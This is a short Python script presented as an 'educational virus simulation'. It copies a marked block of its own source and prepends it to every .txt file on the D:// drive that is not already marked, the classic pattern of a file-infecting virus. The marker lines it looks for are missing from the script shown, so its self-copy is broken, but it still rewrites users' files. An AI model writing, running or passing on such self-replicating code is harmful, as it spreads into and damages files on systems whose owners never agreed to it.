import sys
import glob

# NOTICE: This script is for educational purposes only. Use only in isolated environments.
print('EDUCATIONAL VIRUS SIMULATION DEPLOYED')

# Simulated payload script
virus_script = []
in_virus = False
in_payload = False

with open(sys.argv[0], 'r') as self_script:
    for line in self_script:
        if line == '##### VIRUS START #####\n':
            in_virus = True
        if in_virus:
            virus_script.append(line)
            if line == '##### VIRUS END #####\n':
                break

# Locate files to "infect" (simulate infection in D://*.txt)
programs = glob.glob('D://*.txt')

for program in programs:
    with open(program, 'r+') as f:
        program_code = f.readlines()
        
        # Check if the script is already "infected"
        if '##### VIRUS START #####\n' not in program_code:
            f.seek(0)  # Move to the start of the file
            f.writelines(virus_script)  # Prepend the virus script
            f.writelines(program_code)  # Write the original content back

print("Educational virus simulation complete!")

